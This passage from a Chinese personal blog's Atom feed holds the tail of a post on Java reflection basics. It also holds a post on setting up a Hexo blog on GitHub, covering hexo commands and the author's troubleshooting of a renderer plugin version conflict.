class=""><p>如果方法为私有，也可以同样的设置setAccessible(ture)来进行修改</p><p>以上为java反射机制的基础知识</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;（抽象概念）RTTI（Run-Time Type Identification）运行时类型识别，主要两种方式&lt;br&gt;  传统的RTTI，我们编写知道所有的类型·&lt;br&gt;  反射机制，允许在运行时查询和操作类的信息&lt;br&gt;  太抽象了举例子&lt;br&gt;  正常写代码，</summary>
      
    
    
    
    <category term="Java_Security" scheme="https://usingns.github.io/categories/Java-Security/"/>
    
    
    <category term="Java" scheme="https://usingns.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>关于个人博客的搭建</title>
    <link href="https://usingns.github.io/2025/03/31/%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://usingns.github.io/2025/03/31/%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
    <published>2025-03-31T11:07:23.000Z</published>
    <updated>2025-07-14T05:05:34.845Z</updated>
    
    <content type="html"><![CDATA[<p>很早就有这样的想法，断断续续又有半途而废，终于直到今天才决定完全做成</p><h2 id="首先使用github-hexo的组合"><a href="#首先使用github-hexo的组合" class="headerlink" title="首先使用github+hexo的组合"></a>首先使用github+hexo的组合</h2><p>Hexo 是<strong>一款基于Node.js 的快速、简洁且高效的静态博客框架</strong><br>知道这些就够了()只是抱着使用的想法来了解<br>#git安装<br>#node安装 %%别忘了环境变量的配置%%<br>#安装hexo</p><h2 id="git-ssh-key"><a href="#git-ssh-key" class="headerlink" title="git ssh key"></a>git ssh key</h2><p>为什么要配置SSH key？ 目的：可以免密的将本地的源码和资源上传到github，无需要每次都输账号和密码。<br>本地生成</p><p>上传到github</p><p>配置git用户名和用户邮箱</p><h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot; #新建文章 </span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面 </span><br><span class="line">hexo generate #生成静态页面至public目录 </span><br><span class="line">hexo server #开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server） </span><br><span class="line">hexo deploy #部署到GitHub </span><br><span class="line">hexo help # 查看帮助 </span><br><span class="line">hexo version #查看Hexo的版本</span><br></pre></td></tr></table></figure><p>在选择的根目录进行初步搭建，并修改_config.yml</p><h2 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h2><p>hexo的github主题项目，下载解压到theme，记得修改配置文件<br>大功告成~</p><p>参考</p><p><a href="https://cloud.tencent.com/developer/article/1852344">https://cloud.tencent.com/developer/article/1852344</a></p><p>#####不吐不快的踩坑记录</p><p>1.<code>hexo-renderer-marked</code> 是 Hexo 渲染 Markdown 的核心插件之一<br>这是官方记录的描述，但是正常使用是没有人去自己单独安装他的，至少在2025.7我进行测试的时候，这个版本与当前版本冲突。。。安了会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\blog&gt;hexo g</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span><br></pre></td></tr></table></figure><p>更为无语的是这里的报错查看日志会发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">3:29:01.811 DEBUG Processed: layout/_partial/math/mathjax.ejs</span><br><span class="line">03:29:01.811 DEBUG Processed: layout/_partial/script/font-loader.ejs</span><br><span class="line">03:29:01.811 DEBUG Processed: layout/_partial/sidebar/sidebar-categories.ejs</span><br><span class="line">03:29:01.811 DEBUG Processed: languages/default.yml</span><br><span class="line">03:29:01.812 DEBUG Processed: languages/en.yml</span><br><span class="line">03:29:01.813 DEBUG Processed: layout/_partial/sidebar/sidebar-archives.ejs</span><br><span class="line">03:29:01.813 DEBUG Processed: layout/_partial/sidebar/sidebar-tags.ejs</span><br><span class="line">03:29:01.813 DEBUG Processed: layout/_partial/sidebar/base-sidebar.ejs</span><br><span class="line">03:29:01.815 FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span><br><span class="line">03:29:01.821 DEBUG Database saved</span><br></pre></td></tr></table></figure><p>没错，你没有看错，日志也只有一句模糊的报错而已。。。这是正常人能干出的事情。。。实在无力吐槽</p><p>导致排查的时候根本不知道哪里出现了问题</p><p>解决办法：卸载就好了。。。同时注意卸载之后安装回默认渲染，注意配置文件需要手动修改</p><p>2.各位在搭建的时候一定要注意版本问题，不仅仅是自己系统以及hexo的版本还有查阅文章资料的版本，因为这个系统已经有些年头了，可能中间经过几次维护，导致一些网上文章根本不实用于当前的hexo，再加上有很多低质文章，不说内容雷同，就是插件名字都有抄错的。即便是正儿八经的文章也要注意，上面的办法很可能不适用，在搞了半天之后，回去发布文章直接冒出来一个模模糊糊的FATAL真的让人火大。。。。</p><p>3.此外各种小bug也层出不穷，比如一直为人诟病的图片上传问题，还是使用的人太少了，小作坊无保障了属于是，不过也正是因为他小，各种错误可以穷尽，久病成医</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很早就有这样的想法，断断续续又有半途而废，终于直到今天才决定完全做成&lt;/p&gt;
&lt;h2 id=&quot;首先使用github-hexo的组合&quot;&gt;&lt;a href=&quot;#首先使用github-hexo的组合&quot; class=&quot;headerlink&quot; title=&quot;首先使用github+hex</summary>
      
    
    
    
    <category term="博客搭建" scheme="https://usingns.github.io/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="https://usingns.github.io/tags/Hexo/"/>
    
    <category term="github" scheme="https://usingns.github.io/tags/github/"/>
    
    <category term="node.js" scheme="https://usingns.github.io/tags/node-js/"/>
    
    <category term="ssh" scheme="https://usingns.github.io/tags/ssh/"/>
    
  </entry>
  
</feed>
